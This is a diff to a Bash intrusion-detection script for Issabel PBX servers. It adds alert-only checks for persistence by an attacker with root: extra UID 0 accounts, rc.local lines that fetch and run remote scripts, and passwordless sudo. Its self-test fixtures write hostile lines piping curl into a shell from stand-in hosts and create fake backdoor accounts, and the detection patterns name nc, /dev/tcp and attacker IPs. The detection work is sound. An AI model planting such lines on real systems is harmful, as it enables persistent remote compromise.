@@ -328,7 +328,9 @@ cmd_audit() {
     info "chaves SSH em $f:"; command -v ssh-keygen >/dev/null 2>&1 && ssh-keygen -lf "$f" 2>/dev/null | sed 's/^/     /'
     warn "confira se TODAS as chaves acima sao suas ($f)"
   done
-  grep -rhE 'NOPASSWD' /etc/sudoers /etc/sudoers.d 2>/dev/null | grep -v '^#' | while read -r l; do warn "sudo sem senha: $l"; done
+  grep -rhE 'NOPASSWD' /etc/sudoers /etc/sudoers.d 2>/dev/null | grep -v '^\s*#' | while read -r l; do
+    if echo "$l" | grep -qE 'NOPASSWD:\s*ALL\s*$'; then warn "sudo SEM SENHA PARA QUALQUER COMANDO (nao e padrao do Issabel): $l"; else info "sudo (comando especifico): $l"; fi
+  done
   grep -hiE '^\s*(PermitRootLogin|PasswordAuthentication|Port)\s' /etc/ssh/sshd_config 2>/dev/null | sed 's/^/  sshd: /'
 
   sec "2. Agendamentos (cron)"
@@ -336,7 +338,10 @@ cmd_audit() {
   for u in $(cut -d: -f1 /etc/passwd 2>/dev/null); do
     crontab -l -u "$u" 2>/dev/null | grep -v '^#' | grep -E "$pat" | while read -r l; do warn "cron de $u: $l"; done
   done
-  grep -rHE "$pat" /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/crontab 2>/dev/null | grep -v '^#' | grep -vE 'ipbx-sentinel|ipbx-watchdog|ipbx-front-api' | while read -r l; do warn "$l"; done
+  # um aviso por arquivo (com a 1a linha e a contagem); ignora o que e do proprio Sentinel/painel e o atualizador GeoIP do firewall
+  grep -rcE "$pat" /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/crontab 2>/dev/null | grep -vE ':0$|ipbx-sentinel|ipbx-watchdog|ipbx-front-api|geoip_update' | while IFS=: read -r f n; do
+    warn "$f ($n linha(s) suspeita(s)); 1a: $(grep -E "$pat" "$f" | grep -v '^\s*#' | head -1 | cut -c1-110)"
+  done
   info "arquivos em /etc/cron.d: $(ls /etc/cron.d 2>/dev/null | tr '\n' ' ')"
 
   sec "3. Processos suspeitos"
@@ -355,7 +360,12 @@ cmd_audit() {
 
   sec "5. Persistencia e rootkit"
   [ -s /etc/ld.so.preload ] && warn "/etc/ld.so.preload existe (tipico de rootkit): $(cat /etc/ld.so.preload | head -3 | tr '\n' ' ')"
-  grep -vE '^\s*(#|$|touch /var/lock|exit)' /etc/rc.d/rc.local /etc/rc.local 2>/dev/null | while read -r l; do warn "rc.local: $l"; done
+  for f in /etc/rc.local /etc/rc.d/rc.local; do
+    [ -r "$f" ] || continue
+    grep -vE '^\s*(#|$)' "$f" 2>/dev/null | while read -r l; do
+      if echo "$l" | grep -qE '(curl|wget)[^|]*\|[^|]*(ba)?sh|postroot|nc -|/dev/tcp|base64'; then warn "$f BAIXA/EXECUTA SCRIPT REMOTO NO BOOT: $l"; else info "$f: $l"; fi
+    done
+  done
   find /etc/systemd/system /usr/lib/systemd/system -type f -name '*.service' -mtime "-${days}" 2>/dev/null | head -10 | while read -r l; do warn "servico systemd criado/alterado recentemente: $l"; done
   find /tmp /var/tmp /dev/shm -type f \( -name '*.php' -o -name '*.sh' -o -perm -u+x \) 2>/dev/null | head -15 | while read -r l; do warn "arquivo suspeito em area temporaria: $l"; done
 
@@ -544,7 +554,30 @@ cmd_update_framework() {
   fi
 }
 
-host_checks() { check_firewall; check_dialplan; check_cron; check_framework; }
+# Persistencia de invasor com poderes de root (caso real Issabel 4): conta UID 0 extra,
+# rc.local baixando e executando script remoto (postroot.sh) e sudo sem senha para tudo.
+# So ALERTA, uma vez por achado; nunca altera nada.
+persist_alert() {  # $1 = chave de deduplicacao, $2 = mensagem
+  seen_once "persist|$1" || return 0
+  log "PERSISTENCIA: $2"
+  send_telegram "ALERTA: PERSISTENCIA DE INVASOR - ${HOSTNAME_S}"$'\n'"$(date '+%d/%m/%Y %H:%M:%S')"$'\n'"$2"$'\n\n'"Nada foi alterado. Rode: ipbx-sentinel --audit  (com root comprometido, o caminho mais seguro e reinstalar a partir de backup limpo)."
+}
+
+check_persistence() {
+  local u l f
+  while read -r u; do [ -n "$u" ] && persist_alert "uid0|$u" "usuario com poderes de root alem do root: $u (UID 0)"; done \
+    < <(awk -F: '$3==0 && $1!="root"{print $1}' "${SENTINEL_PASSWD:-/etc/passwd}" 2>/dev/null)
+  for f in ${SENTINEL_RCLOCAL:-/etc/rc.local /etc/rc.d/rc.local}; do
+    [ -r "$f" ] || continue
+    while read -r l; do [ -n "$l" ] && persist_alert "rc|$f|$l" "$f baixa e executa script remoto a cada boot: $l"; done \
+      < <(grep -vE '^\s*#' "$f" 2>/dev/null | grep -E '(curl|wget)[^|]*\|[^|]*(ba)?sh|postroot|212\.83\.160|104\.194\.143')
+  done
+  # shellcheck disable=SC2086
+  while read -r l; do [ -n "$l" ] && persist_alert "sudo|$l" "sudo SEM SENHA para qualquer comando: $l"; done \
+    < <(cat ${SENTINEL_SUDOERS:-/etc/sudoers /etc/sudoers.d/*} 2>/dev/null | grep -vE '^\s*#' | grep -E 'NOPASSWD:\s*ALL\s*$')
+}
+
+host_checks() { check_firewall; check_dialplan; check_cron; check_framework; check_persistence; }
 
 do_scan() {
   local mode="$1"
@@ -639,12 +672,15 @@ cmd_selftest() {
   printf '#!/bin/bash\ncase "$1" in is-enabled) exit 0;; is-active) echo inactive; exit 3;; *) exit 0;; esac\n' > "$T/bin/systemctl"; chmod +x "$T/bin/systemctl"
   echo 'exten => s,1,Goto(thanku-outcall,s,1)' > "$T/extensions_custom.conf"
   echo '* * * * * curl http://exemplo.invalido/x | sh' > "$T/cron/asterisk"
-  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" "$0" --scan >/dev/null 2>&1 )
+  printf 'root:x:0:0:root:/root:/bin/bash\nyum:x:0:0::/home/yum:/bin/bash\nabort:x:0:0::/:/bin/bash\nasterisk:x:100:100::/:/bin/bash\n' > "$T/passwd"
+  printf '#!/bin/bash\n/usr/local/sbin/motd.sh > /etc/motd\nbash -c "curl -ks http://203.0.113.9/r/postroot.sh|bash"\n' > "$T/rc.local"
+  printf 'asterisk ALL = NOPASSWD: /sbin/service\nasterisk ALL=(ALL) NOPASSWD: ALL\n' > "$T/sudoers"
+  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" SENTINEL_PASSWD="$T/passwd" SENTINEL_RCLOCAL="$T/rc.local" SENTINEL_SUDOERS="$T/sudoers" "$0" --scan >/dev/null 2>&1 )
   chk() { if [ "$2" = "gone" ] && [ ! -e "$1" ]; then ok=$((ok+1)); elif [ "$2" = "kept" ] && [ -e "$1" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: $1 deveria estar '$2'"; fi; }
   chk "$T/web/modules/a_emad.php" gone;  chk "$T/web/modules/b_chain.php" gone;  chk "$T/web/modules/c_decode.php" gone
   chk "$T/web/images/d_static.php" gone; chk "$T/web/admin/modules/phones" gone
   chk "$T/web/modules/legitimo.php" kept; chk "$T/web/admin/libraries/php-upgrade/compat.php" kept; chk "$T/web/admin/modules/core/XML_Unserializer.php" kept
-  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "CRON suspeito" "FRAMEWORK vulneravel"; do
+  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "CRON suspeito" "FRAMEWORK vulneravel" "PERSISTENCIA: usuario com poderes de root alem do root: yum" "PERSISTENCIA: usuario com poderes de root alem do root: abort" "baixa e executa script remoto a cada boot" "sudo SEM SENHA para qualquer comando"; do
     if grep -qF "$k" "$T/log"; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: alerta '$k' nao gerado"; fi
   done
   rm -rf "$T"
